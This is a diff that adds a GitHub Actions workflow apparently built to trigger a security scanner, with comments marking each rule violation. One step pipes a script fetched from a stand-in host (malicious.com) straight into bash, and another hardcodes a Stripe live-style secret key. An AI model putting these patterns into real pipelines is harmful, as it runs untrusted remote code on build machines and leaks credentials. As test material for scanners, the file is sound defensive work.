@@ -1,0 +1,16 @@
+name: Broken Security Test
+on: [push]
+
+jobs:
+  hack_me:
+    runs-on: ubuntu-latest
+    steps:
+      - name: This will trigger the scanner
+        # RULE BREAKER 1: Piping curl to bash
+        run: curl -sL http://malicious.com/script.sh | bash
+
+      - name: Leaking Secrets
+        env:
+          # RULE BREAKER 2: Hardcoded Secret
+          STRIPE_KEY: "sk_live_51HvT..."
+        run: echo "I am leaking secrets"
